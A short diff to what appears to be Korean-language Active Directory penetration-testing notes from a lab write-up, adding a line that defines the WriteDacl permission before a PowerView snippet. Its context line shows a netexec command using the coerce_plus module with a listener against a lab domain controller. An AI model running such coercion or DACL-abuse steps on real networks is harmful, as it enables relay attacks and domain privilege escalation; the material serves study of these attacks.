@@ -1637,7 +1637,8 @@ netexec smb dc1.delegate.vl -u 'oxdf$' -p 0xdf0xdf. -M coerce_plus -o LISTENER=o
 ---
 <details>
   <summary><strong>WriteDacl</strong></summary>
-  
+
+- 대상 객체의 DACL을 수정할 수 있는 권한.
 - Windows 보안 모델에서 DACL을 수정하라는 명령을 받았을 때, 시스템은 즉시 "이 요청자가 WriteDacl(또는 이를 포함하는 GenericAll 등) 권한을 가지고 있는가?"를 확인.
 ```powershell
 . .\powerview.ps1
